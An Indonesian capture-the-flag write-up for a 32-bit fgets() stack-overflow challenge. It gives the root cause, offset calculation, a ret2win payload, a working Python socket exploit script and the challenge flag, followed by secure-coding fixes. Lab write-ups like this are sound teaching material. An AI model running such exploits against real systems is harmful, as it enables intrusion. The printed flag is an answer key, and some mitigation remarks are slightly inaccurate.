# 736 - Echo Escape 2 (Binary Exploitation, picoCTF 2026, Medium)

## Challenge Metadata
- ID: 736 | Event: picoCTF 2026 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 100
- Flag: `academy{fgets_0v3rfl0w42_8cb8052a}`

## Problem Statement & Scope
Tantangan menyajikan skenario mitigasi parsial di mana pengembang berusaha memperbaiki kerentanan input `gets()` dengan menggantinya menggunakan fungsi standar `fgets()`. Namun, implementasi parameter batas panjang `fgets()` salah dikonfigurasi, memungkinkan penulisan melebihi batas buffer stack pada biner ELF 32-bit x86.

## Teori & Akar Kerentanan (Root Cause)
1. **Flawed Input Bounds in fgets() (CWE-120 / CWE-121):**
   Pada fungsi `vuln()`, variabel buffer stack dideklarasikan berukuran 32 byte (`char buf[32]`), namun parameter ukuran yang diteruskan ke `fgets()` ditetapkan sebesar 128 byte:
   ```c
   void vuln() {
       char buf[32];
       fgets(buf, 128, stdin);
   }
   ```
   Secara semantik, pengembang mengira `fgets()` otomatis mengamankan buffer dari overflow, mengabaikan fakta bahwa parameter kedua menentukan jumlah byte maksimum yang dibaca tanpa memvalidasi ukuran memori tujuan secara otomatis.
2. **Arsitektur Stack Frame x86 32-bit:**
   Pada fungsi `vuln()`, alokasi stack dilakukan melalui:
   ```assembly
   sub esp, 0x38
   lea eax, [ebp - 0x28]
   push eax
   push 0x80
   call fgets
   ```
   Buffer `buf` ditempatkan pada alamat `[ebp - 0x28]` (40 byte desimal sebelum frame pointer `ebp`).
   Offset padding untuk menimpa saved return address:
   - Jarak `buf` ke `ebp` = 40 byte.
   - Ukuran `saved EBP` (32-bit x86) = 4 byte.
   - Total padding menuju `saved EIP` = `40 + 4 = 44` byte.
3. **Ketiadaan Mitigasi Modern:**
   Biner tidak memiliki stack canary (`No Canary found`), non-PIE (`base address 0x08048000`), dan No-Execute (`NX active`). Fungsi `win()` berada pada alamat statis `0x080491d6`.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Inspeksi Disassembly:**
   - Memeriksa letak fungsi `win()` dengan `objdump -d -M intel vuln | grep "<win>:"` -> ditemukan pada `0x080491d6`.
   - Menghitung offset stack: 40 byte buffer + 4 byte frame pointer = 44 byte.
2. **Penyusunan Payload Eksploitasi:**
   `payload = b"A" * 44 + struct.pack("<I", 0x080491d6) + b"\n"`
3. **Pengujian dan Eksekusi:**
   Mengirimkan payload ke container `nc xebec.cylabacademy.net 13836`. Program menerima input, menyelesaikan fungsi `vuln()`, dan instruksi `ret` melompat langsung ke alamat `win()` yang mengeksekusi pembacaan `flag.txt`.

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_736_echo_escape_2.py`:
```python
import socket, struct

WIN_ADDR = 0x080491d6
PAYLOAD_OFFSET = 44

payload = b"A" * PAYLOAD_OFFSET + struct.pack("<I", WIN_ADDR) + b"\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("xebec.cylabacademy.net", 13836))
s.recv(1024)
s.sendall(payload)
print(s.recv(1024).decode())
```

## Mitigasi & Kepatuhan Standar (NIST SP 800-115 / SP 800-53)
- **Koreksi Kode Sumber (Secure Coding Standard):**
   Gunakan idiom dinamis `sizeof()` untuk mencegah human error penetapan konstanta numerik:
   ```c
   fgets(buf, sizeof(buf), stdin);
   ```
- **NIST SP 800-53 SA-11 (Developer Testing and Evaluation):** Menerapkan pengujian analisis statis kode (SAST) dan compiler flags `-Wformat-security` serta `-D_FORTIFY_SOURCE=2` untuk mendeteksi inkonsistensi ukuran buffer saat kompilasi.

## Rekap Tim AI (Orkestrasi & Bimbingan LKS)
- **David (Leader):** Mengarahkan perbandingan antara eksploitasi 64-bit (Echo Escape 1) dan 32-bit (Echo Escape 2).
- **Charlie (Trend-hunter):** Menyoroti pola kesalahan umum developer pemula dalam migrasi API C dari `gets()` ke `fgets()`.
- **Alex (Fullstack-dev) & Omnirush (Executor):** Mengotomasi pembuatan payload 32-bit little-endian packing (`<I`) dan pembacaan banner interaktif.
- **Julius (QA-engineer):** Menjalankan verifikasi token API CyLab dan memastikan clean lifecycle container deallocation.
- **Athena (Security-engineer):** Mengaudit struktur stack frame dan pemetaan CWE-120/CWE-121 terhadap kontrol NIST SP 800-53 SA-11.
- **Judith (Guru LKS):** Merangkum perbandingan layout memori 32-bit vs 64-bit sebagai materi fundamental bimbingan siswa LKS bidang Cyber Security.
